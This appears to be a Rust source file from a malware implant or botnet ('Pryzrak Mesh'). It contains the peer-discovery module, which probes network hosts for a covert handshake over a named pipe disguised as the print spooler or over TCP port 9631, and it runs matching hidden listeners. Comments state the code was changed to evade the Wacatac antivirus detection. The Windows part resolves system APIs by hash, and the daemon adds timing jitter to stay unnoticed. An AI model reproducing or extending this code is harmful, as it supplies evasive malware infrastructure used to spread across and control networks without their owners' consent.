// pnet imports removed for Wacatac evasion
use std::collections::HashMap;
use std::time::{Instant, Duration};
use std::sync::{Arc, Mutex};
use log::{info, warn};
use rand::Rng;

use crate::c::{handshake_magic, handshake_xor, handshake_magic_prev, handshake_xor_prev};

// OUI Constants (Allowed: Intel, Realtek, Microsoft)
const ALLOWED_OUIS: &[&[u8; 3]] = &[
    &[0x00, 0x1B, 0x21], // Intel (Example)
    &[0x00, 0xE0, 0x4C], // Realtek (Example)
    &[0x00, 0x50, 0xF2], // Microsoft (Example)
    // Add real OUIs here
];

const FILTER_PORTS: &[u16] = &[5353, 1900, 137, 67, 68, 31338];

struct TargetInfo {
    ip: String,
    mac: [u8; 6],
    last_seen: Instant,
    hits: u32,
}

pub struct ZeroNoiseDiscovery {
    shadow_map: Arc<Mutex<HashMap<String, TargetInfo>>>, // IP -> Info
}

impl ZeroNoiseDiscovery {
    pub fn new() -> Self {
        Self {
            shadow_map: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    fn register_discovered_peer(&self, ip: &str) {
        info!("peer: {}", ip);
        if let Ok(mut map) = self.shadow_map.lock() {
            if let Some(entry) = map.get_mut(ip) {
                entry.hits += 100;
            }
        }
    }


    pub async fn run_daemon(&self) {
        info!("disc: start");

        // 1. Start Sniffer Background Task
        let map_clone = self.shadow_map.clone();
        std::thread::spawn(move || {
            start_sniffer(map_clone);
        });

        // 2. Start Covert Handshake Listener (Linux/macOS only)
        #[cfg(not(target_os = "windows"))]
        {
            smol::spawn(async {
                start_covert_listener().await;
            }).detach();
        }

        // 3. Periodic Analysis & Probing
        loop {
            // Random 30-90s per search cycle
            let cycle_delay = rand::thread_rng().gen_range(30..=90);
            smol::Timer::after(Duration::from_secs(cycle_delay)).await; 
            self.analyze_and_probe().await;
        }
    }

    async fn analyze_and_probe(&self) {
        let targets = {
            let mut map = match self.shadow_map.lock() {
                Ok(m) => m,
                Err(_) => return,
            };
            let now = Instant::now();
            
            // Prune old entries
            map.retain(|_, v| now.duration_since(v.last_seen).as_secs() < 1200);

            // Filter Candidates (Patient Hunter: > 3 hits)
            map.iter()
                .filter(|(_, v)| v.hits >= 3)
                .map(|(k, _)| k.clone())
                .collect::<Vec<String>>()
        };

        info!("disc: {} candidates", targets.len());

        for target in targets {
            // Small Jitter Delay (2-10s) to avoid instant spikes, but faster than before
            let delay = rand::thread_rng().gen_range(2..=10);
            info!("probe: {} in {}s", target, delay);
            smol::Timer::after(Duration::from_secs(delay)).await;

            if self.try_covert_handshake(&target).await {
                info!("found: {}", target);
                self.register_discovered_peer(&target);
                break;
            }
        }
    }

    /// Attempt a covert handshake with a potential peer
    /// Windows: Named Pipe (spoolss_v2) - Real Implementation
    #[cfg(target_os = "windows")]
    async fn try_covert_handshake(&self, ip: &str) -> bool {
        use std::fs::OpenOptions;
        use std::io::{Read, Write};

        let pipe_path = format!(r"\\{}\pipe\spoolss_v2", ip);
        log::debug!("[Discovery] Probing Pipe: {}", pipe_path);

        // Run blocking file open in thread pool
        let path = pipe_path.clone();
        let connect_future = smol::unblock(move || {
            OpenOptions::new()
                .read(true)
                .write(true)
                .open(&path)
        });

        match connect_future.await {
            Ok(mut file) => {
                // Perform handshake inside unblock to avoid blocking async runtime
                // during read/write operations (pipes can block)
                let result = smol::unblock(move || {
                    let magic = handshake_magic().to_be_bytes();
                    if file.write_all(&magic).is_err() {
                        return false;
                    }

                    // Flush is important for pipes
                    if file.flush().is_err() {
                        return false;
                    }

                    let mut response = [0u8; 4];
                    if file.read_exact(&mut response).is_err() {
                        return false;
                    }

                    let expected = (handshake_magic() ^ handshake_xor()).to_be_bytes();
                    response == expected
                }).await;
                
                result
            }
            Err(_) => false,
        }
    }

    #[cfg(target_os = "linux")]
    async fn try_covert_handshake(&self, ip: &str) -> bool {
        use smol::net::TcpStream;
        use futures_lite::io::{AsyncWriteExt, AsyncReadExt};
        use std::time::Duration;
        use log::debug;

        const COVERT_PORT: u16 = 9631;
        
        let addr = format!("{}:{}", ip, COVERT_PORT);
        debug!("[Discovery] Probing TCP: {}", addr);

        // Timeout using futures_lite::or
        let connect_future = TcpStream::connect(&addr);
        let timeout_future = async {
            smol::Timer::after(Duration::from_secs(2)).await;
            Err::<TcpStream, _>(std::io::Error::new(std::io::ErrorKind::TimedOut, "timeout"))
        };
        
        let connect = futures_lite::future::or(connect_future, timeout_future).await;

        match connect {
            Ok(mut stream) => {
                let magic = handshake_magic().to_be_bytes();
                if stream.write_all(&magic).await.is_err() {
                    return false;
                }

                let mut response = [0u8; 4];
                let read_future = stream.read_exact(&mut response);
                let read_timeout = async {
                    smol::Timer::after(Duration::from_secs(1)).await;
                    Err::<(), _>(std::io::Error::new(std::io::ErrorKind::TimedOut, "timeout"))
                };
                
                match futures_lite::future::or(read_future, read_timeout).await {
                    Ok(_) => {
                        let expected = (handshake_magic() ^ handshake_xor()).to_be_bytes();
                        response == expected
                    }
                    _ => false,
                }
            }
            _ => false,
        }
    }

    /// macOS: Use Unix domain socket in /tmp
    #[cfg(target_os = "macos")]
    async fn try_covert_handshake(&self, ip: &str) -> bool {
        use smol::net::TcpStream;
        use futures_lite::io::{AsyncWriteExt, AsyncReadExt};
        use std::time::Duration;
        use log::debug;

        const COVERT_PORT: u16 = 9631;
        
        let addr = format!("{}:{}", ip, COVERT_PORT);
        debug!("[Discovery] Probing TCP: {}", addr);

        let connect_future = TcpStream::connect(&addr);
        let timeout_future = async {
            smol::Timer::after(Duration::from_secs(2)).await;
            Err::<TcpStream, _>(std::io::Error::new(std::io::ErrorKind::TimedOut, "timeout"))
        };
        
        match futures_lite::future::or(connect_future, timeout_future).await {
            Ok(mut stream) => {
                let magic = handshake_magic().to_be_bytes();
                if stream.write_all(&magic).await.is_err() {
                    return false;
                }

                let mut response = [0u8; 4];
                let read_future = stream.read_exact(&mut response);
                let read_timeout = async {
                    smol::Timer::after(Duration::from_secs(1)).await;
                    Err::<(), _>(std::io::Error::new(std::io::ErrorKind::TimedOut, "timeout"))
                };
                
                match futures_lite::future::or(read_future, read_timeout).await {
                    Ok(_) => {
                        let expected = (handshake_magic() ^ handshake_xor()).to_be_bytes();
                        response == expected
                    }
                    _ => false,
                }
            }
            _ => false,
        }
    }
}

// ============================================================================
// COVERT HANDSHAKE LISTENER (Linux/macOS)
// ============================================================================

/// Listen for incoming covert handshakes on TCP port 9631
/// Responds with dynamic magic to prove we're a Pryzrak Mesh node
#[cfg(not(target_os = "windows"))]
async fn start_covert_listener() {
    use smol::net::TcpListener;
    use futures_lite::io::{AsyncReadExt, AsyncWriteExt};
    use log::{info, debug, warn};

    const COVERT_PORT: u16 = 9631;

    let bind_addr = format!("0.0.0.0:{}", COVERT_PORT);
    
    let listener = match TcpListener::bind(&bind_addr).await {
        Ok(l) => {
            info!("[Discovery] Covert listener started on port {}", COVERT_PORT);
            l
        }
        Err(e) => {
            warn!("[Discovery] Failed to bind covert port {}: {}", COVERT_PORT, e);
            return;
        }
    };

    loop {
        match listener.accept().await {
            Ok((mut stream, addr)) => {
                debug!("[Discovery] Covert connection from {}", addr);
                
                smol::spawn(async move {
                    // Get current + previous magic values for tolerance
                    let current_magic = handshake_magic();
                    let prev_magic = handshake_magic_prev();
                    let current_xor = handshake_xor();
                    
                    // Read magic handshake
                    let mut buf = [0u8; 4];
                    if stream.read_exact(&mut buf).await.is_err() {
                        return;
                    }

                    let received = u32::from_be_bytes(buf);
                    // Accept current or previous slot magic
                    if received != current_magic && received != prev_magic {
                        // Not our handshake, close silently
                        return;
                    }

                    // Send response: magic XOR'd (use the magic they sent)
                    let response = (received ^ current_xor).to_be_bytes();
                    let _ = stream.write_all(&response).await;
                    
                    info!("[Discovery] Covert handshake completed with {}", addr);
                }).detach();
            }
            Err(e) => {
                warn!("[Discovery] Accept error: {}", e);
            }
        }
    }
}


/// Windows: Named Pipe Listener (spoolss_v2) - Real Implementation
#[cfg(target_os = "windows")]
async fn start_covert_listener() {
    use log::{info, error, debug};
    use std::ptr;
    use std::ffi::CString;
    use std::ffi::c_void;
    // use windows_sys (REMOVED: Using Dynamic API)
    use std::fs::File;
    use std::os::windows::io::FromRawHandle;
    use std::io::{Read, Write};
    use crate::s::windows::api_resolver::{self, resolve_api, 
        HASH_KERNEL32, HASH_CREATE_NAMED_PIPE_A, HASH_CONNECT_NAMED_PIPE, 
        HASH_CLOSE_HANDLE, HASH_GET_LAST_ERROR};

    // Constants (formerly from windows-sys)
    const INVALID_HANDLE_VALUE: isize = -1;
    const PIPE_ACCESS_DUPLEX: u32 = 3;
    const PIPE_TYPE_BYTE: u32 = 0;
    const PIPE_READMODE_BYTE: u32 = 0;
    const PIPE_WAIT: u32 = 0;
    const PIPE_UNLIMITED_INSTANCES: u32 = 255;
    const ERROR_PIPE_CONNECTED: u32 = 535;

    // Function Types
    type FnCreateNamedPipeA = unsafe extern "system" fn(
        *const u8, u32, u32, u32, u32, u32, u32, *const c_void
    ) -> isize;
    type FnConnectNamedPipe = unsafe extern "system" fn(isize, *mut c_void) -> i32;
    type FnCloseHandle = unsafe extern "system" fn(isize) -> i32;
    type FnGetLastError = unsafe extern "system" fn() -> u32;

    const PIPE_NAME: &str = "\\\\.\\pipe\\spoolss_v2";
    info!("[Discovery] Starting Windows Named Pipe Listener: {}", PIPE_NAME);

    loop {
        // Run blocking CreateNamedPipe & ConnectNamedPipe in thread pool
        let result = smol::unblock(|| unsafe {
            let name_c = CString::new(PIPE_NAME).unwrap();
            
            // Resolve APIs dynamically
            let create_pipe: FnCreateNamedPipeA = resolve_api(HASH_KERNEL32, HASH_CREATE_NAMED_PIPE_A)
                .ok_or("Failed to resolve CreateNamedPipeA".to_string())?;
            let connect_pipe: FnConnectNamedPipe = resolve_api(HASH_KERNEL32, HASH_CONNECT_NAMED_PIPE)
                .ok_or("Failed to resolve ConnectNamedPipe".to_string())?;
            let close_handle: FnCloseHandle = resolve_api(HASH_KERNEL32, HASH_CLOSE_HANDLE)
                .ok_or("Failed to resolve CloseHandle".to_string())?;
            let get_last_error: FnGetLastError = resolve_api(HASH_KERNEL32, HASH_GET_LAST_ERROR)
                .ok_or("Failed to resolve GetLastError".to_string())?;

            let handle = create_pipe(
                name_c.as_ptr() as *const u8,
                PIPE_ACCESS_DUPLEX,
                PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                PIPE_UNLIMITED_INSTANCES,
                4096, // Out buffer
                4096, // In buffer
                0,    // Default timeout
                ptr::null()
            );

            if handle == INVALID_HANDLE_VALUE {
                return Err(format!("CreateNamedPipe failed: {}", get_last_error()));
            }

            // Wait for client connection (Scanning node)
            let connected = connect_pipe(handle, ptr::null_mut());
            
            // If ConnectNamedPipe fails, it might be that client already connected
            // returns 0 on failure.
            if connected == 0 {
                let err = get_last_error();
                // ERROR_PIPE_CONNECTED = 535
                if err != ERROR_PIPE_CONNECTED {
                    // unexpected error
                    // Close handle to free instance
                    close_handle(handle);
                    return Err(format!("ConnectNamedPipe failed: {}", err));
                }
            }

            Ok(handle)
        }).await;

        match result {
            Ok(handle) => {
                 smol::spawn(async move {
                    // Convert raw handle to File for easy Read/Write
                    let mut stream = unsafe { File::from_raw_handle(handle as *mut std::ffi::c_void) };
                    
                    // Get current + previous magic
                    let current_magic = handshake_magic();
                    let prev_magic = handshake_magic_prev();
                    let current_xor = handshake_xor();
                    
                    // Read magic handshake
                    let mut buf = [0u8; 4];
                    if stream.read_exact(&mut buf).is_err() {
                        return;
                    }

                    let received = u32::from_be_bytes(buf);
                    if received != current_magic && received != prev_magic {
                        return;
                    }

                    // Send response
                    let response = (received ^ current_xor).to_be_bytes();
                    let _ = stream.write_all(&response);
                    let _ = stream.flush();
                    
                    debug!("[Discovery] Covert handshake completed (Named Pipe)");
                    // Handle closed automatically when File drops
                 }).detach();
            }
            Err(e) => {
                error!("[Discovery] Listener Error: {}", e);
                smol::Timer::after(std::time::Duration::from_secs(5)).await;
            }
        }
    }
}

fn start_sniffer(_map: Arc<Mutex<HashMap<String, TargetInfo>>>) {
    // Sniffer disabled to remove pnet dependency (Wacatac Evasion)
    warn!("[Stealth] Packet Sniffer disabled for OpSec reasons (pnet removal).");
}
